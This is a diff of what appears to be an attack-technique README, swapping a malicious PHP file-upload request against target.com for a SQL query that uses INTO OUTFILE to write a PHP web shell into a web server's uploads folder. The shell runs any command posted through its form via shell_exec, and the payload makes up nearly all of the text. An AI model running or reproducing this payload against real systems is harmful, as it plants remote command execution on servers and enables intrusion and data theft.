@@ -11,13 +11,18 @@
     <img src="https://img.shields.io/badge/php-5-green.svg">
 </p>
 
-1. Change the `Content-Type` value
+1. Change the `Query SQL` value
 ```
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
+SELECT '<?php
+if (isset($_POST["submit"])) {
+    $cmd = $_POST["cmd"];
+    echo "<pre>" . shell_exec($cmd) . "</pre>";
+}
+?>
 
----------------------------829348923824
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
-Content-Type: application/x-php
+<form action="" method="post">
+    <input type="text" name="cmd" placeholder="Enter command" size="50" required>
+    <input type="submit" name="submit" value="Execute">
+</form>' INTO OUTFILE '/var/www/html/web/uploads/cmd.php'
+FIELDS TERMINATED BY '' LINES TERMINATED BY '';
 ```
